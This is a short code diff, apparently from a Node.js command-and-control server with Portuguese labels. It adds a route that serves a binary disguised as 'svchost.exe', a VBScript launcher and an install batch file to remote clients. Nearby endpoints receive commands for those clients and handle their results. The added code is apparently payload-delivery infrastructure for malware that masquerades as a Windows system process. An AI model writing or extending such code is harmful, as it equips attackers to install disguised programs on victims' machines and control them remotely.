@@ -33,6 +33,21 @@ function handleResult(result) {
     commandId = "";
 }
 
+
+router.get("/dist/:arquivo", (req, res) => {
+    const arquivo = req.params.arquivo;
+
+    if (arquivo === "hihat") {
+        res.sendFile(path.join(__dirname, "../client/svchost.exe"));
+    } else if (arquivo === "launcher") {
+        res.sendFile(path.join(__dirname, "../client/launcher.vbs"));
+    } else if (arquivo === "install") {
+        res.sendFile(path.join(__dirname, "../client/install.bat"));
+    } else {
+        res.status(404).send("Arquivo não encontrado");
+    }
+});
+
 router.post("/set_command", async (req, res) => {
     const { command } = req.body;
     console.log("[set_command] Recebido:", command);
